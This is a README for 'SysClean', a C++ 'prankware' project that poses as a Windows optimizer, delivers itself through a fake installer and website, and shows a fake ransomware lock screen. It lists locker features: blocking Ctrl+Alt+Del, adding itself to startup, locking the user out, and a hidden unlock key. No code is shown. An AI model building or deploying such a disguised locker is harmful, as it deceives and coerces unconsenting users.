# ECM88-Prank-Ransomware
# 🧼 SysClean – Windows System Optimization Tool (PRANKWARE)

**SysClean** is a fake system utility prank designed to simulate a professional system optimizer and ransomware interface. Built entirely in C++ with a GUI, this project demonstrates how social engineering, visual design, and basic system interaction can create a convincing (but harmless) prank experience for educational or entertainment purposes.

> ⚠️ **Disclaimer**: This software is for educational and entertainment use **only**. Do not deploy it without full consent from the target. The author is not responsible for any misuse.

---

## 🎯 Project Features

- 🔐 **Fake ransomware GUI** with a 24-hour countdown
- 🧠 **"Decryption Key" input field** (only accepts the hidden key: `ethanmorgan`)
- ⛔ **Disables exit options** (Windows key, Ctrl+Alt+Del, etc.)
- 🌀 **Automatically adds itself to Windows startup**
- 🧍 **Locks user out** unless correct passphrase is typed
- 💾 **Persistent timer state** survives reboot
- 💸 **Displays fake Bitcoin address for realism**
- 🪟 **Fullscreen, centered red-box GUI** with black background for dramatic effect
- 🧩 **Silent auto-launch via Inno Setup "SysClean Installer"**
- 🎨 **Professional-looking site & branding** (https://sites.google.com/view/sysclean) This is if you do not want to build the excecutable yourself.

---

## 💻 Tech Stack

- **C++ (MinGW)**
- **Win32 API** for GUI & system-level control
- **Inno Setup** to create a fake installer (SysClean_Installer.exe)
- **Google Sites** used for realistic web delivery and download

---

## 📁 Project Structure

```plaintext
SysClean/
├── ecm88.exe              ← Final prank EXE
├── main.cpp               ← Main C++ source file
├── icon.ico               ← Fake SysClean icon
├── config.txt             ← Tracks state (decrypted or not)
├── installer.iss          ← Inno Setup script for building installer
├── SysClean_Installer.exe ← The fake installer
├── .vscode/tasks.json     ← VSCode build tasks (optional)

